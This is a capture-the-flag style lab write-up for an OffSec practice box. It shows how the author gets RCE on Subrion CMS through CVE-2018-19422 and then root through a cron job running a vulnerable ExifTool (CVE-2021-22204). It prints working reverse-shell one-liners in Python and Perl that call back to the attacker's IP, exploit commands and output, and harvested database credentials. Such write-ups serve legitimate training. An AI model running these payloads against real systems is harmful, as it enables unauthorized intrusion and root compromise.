

## Lab Details
- Difficulty: Intermediate 
- OS: Linux
- Foothold time: 1 hour and 50 minutes
- Privesc time: 
- Total solve time: 1 hour and 50 minutes

## Summary
- Initial access:
- Privilege escalation:

## Enumeration
- Key findings:
##### Steps
## Foothold
- Path: RCE via CVE-2018-19422
- Key commands: `ffuf`, POC
##### Steps
- run `ffuf` found `/panel` directory 
```
$ ffuf -u http://exfiltrated.offsec/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -fc 403,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://exfiltrated.offsec/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,302
________________________________________________

redirect.php            [Status: 200, Size: 1048, Words: 194, Lines: 34, Duration: 51ms]
favicon.ico             [Status: 200, Size: 1150, Words: 10, Lines: 4, Duration: 0ms]
license.txt             [Status: 200, Size: 35147, Words: 5836, Lines: 675, Duration: 12ms]
cron.php                [Status: 200, Size: 43, Words: 1, Lines: 1, Duration: 1158ms]
rss.xml                 [Status: 200, Size: 104, Words: 5, Lines: 3, Duration: 23ms]
robots.txt              [Status: 200, Size: 142, Words: 9, Lines: 8, Duration: 0ms]
sitemap.xml             [Status: 200, Size: 637, Words: 6, Lines: 4, Duration: 0ms]
.                       [Status: 200, Size: 21687, Words: 9133, Lines: 581, Duration: 90ms]
index.php               [Status: 200, Size: 21693, Words: 9133, Lines: 581, Duration: 2302ms]
<SNIP>
```
- login with default credential `admin : admin`
![[Pasted image 20260402170646.png]]
- search online and found POC for Arbitrary File Upload for `Subrion CMS 4.2.1` https://www.exploit-db.com/exploits/49876
- working POC found https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE
- download and run, web shell as user `www-data` obtained
```
$ python ./exploit.py -u http://exfiltrated.offsec/panel -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: tgWCeIo2GOFBF440PLMCjqza6Q9jz2g1J79QHGJ4
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: mbunsjxlpowqorp

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/mbunsjxlpowqorp.phar
```
- inject reverse shell code into the web shell obtain foothold on target
```
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.238",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```
- on local listener reverse shell obtained
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.238] from (UNKNOWN) [192.168.102.163] 50388
www-data@exfiltrated:/var/www/html/subrion/uploads$
```
## Lateral Movement 
- Path:
- Key commands:
##### Steps

## Privilege Escalation
- Path: CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
- Key commands: POC exploit
##### Steps
- enumerate the web application directory found `config` for the web app
```
www-data@exfiltrated:/var/www/html/subrion$ cat index.php
<SNIP>
if (file_exists(IA_INCLUDES . 'config.inc.php')) {
    include IA_INCLUDES . 'config.inc.php';
    defined('INTELLI_DEBUG') || $performInstallation = true;
} else {
    $performInstallation = true;
}
<SNIP>
```
- found the database credential for web app
```
www-data@exfiltrated:/var/www/html/subrion$ find ./ -name "config.inc.php" 2>/dev/null
www-data@exfiltrated:/var/www/html/subrion$ cat ./includes/config.inc.php
<?php
/*
 * Subrion Open Source CMS 4.2.1
 * Config file generated on 10 June 2021 12:04:54
 */

define('INTELLI_CONNECT', 'mysqli');
define('INTELLI_DBHOST', 'localhost');
define('INTELLI_DBUSER', 'subrionuser');
define('INTELLI_DBPASS', 'target100');
define('INTELLI_DBNAME', 'subrion');
define('INTELLI_DBPORT', '3306');
define('INTELLI_DBPREFIX', 'sbr421_');

define('IA_SALT', '#5A7C224B51');

// debug mode: 0 - disabled, 1 - enabled
define('INTELLI_DEBUG', 0);
```
- however no credential found in the database 
```
mysql -u subrionuser -ptarget100 -h localhost
```
- load and run `linpeas.sh`
```
╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  3 root root 4096 Jun 10  2021 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
-rwxr-xr-x  1 root root  437 Jun 10  2021 image-exif.sh
drwxr-xr-x  2 root root 4096 Jun 10  2021 metadata
```
- found a script named `image-exif.sh` which is executed by cron job every minute
```
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /etc/crontab
<SNIP>
* *     * * *   root    bash /opt/image-exif.sh
```
- examine the script, script itself is secure however the version of `exiftools` is vulnerable 
```bash
www-data@exfiltrated:/var/www/html/subrion/backup$ cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename;
do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```
- checking version of `exiftools`
```
www-data@exfiltrated:/var/www/html/subrion/uploads$ exiftool -ver
11.88
```
- search online for exploit on `exiftools` and found CVE-2021-22204 (ExifTool) - Arbitrary Code Execution https://github.com/UNICORDev/exploit-CVE-2021-22204
- download the POC to localhost and generate a payload for reverse shell
```
$ python3 exploit-CVE-2021-22204.py -s 192.168.45.238 25
/home/kali/demo/exploit-CVE-2021-22204.py:77: SyntaxWarning: invalid escape sequence '\c'
  payload = "(metadata \"\c${"

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(25,inet_aton('192.168.45.238')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"
```
- load the reverse shell payload to target and wait a minute for reverse shell connection
```
$ nc -lvnp 25
listening on [any] 25 ...
connect to [192.168.45.238] from (UNKNOWN) [192.168.102.163] 47732
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
## Lessons Learned
- Attack family: Web RCE, Linux Privilege Escalation 
- Key takeaway: 
	- For vulnerable scripts ensure the programs invovled are also checked 
##### Steps

## Resources
- References: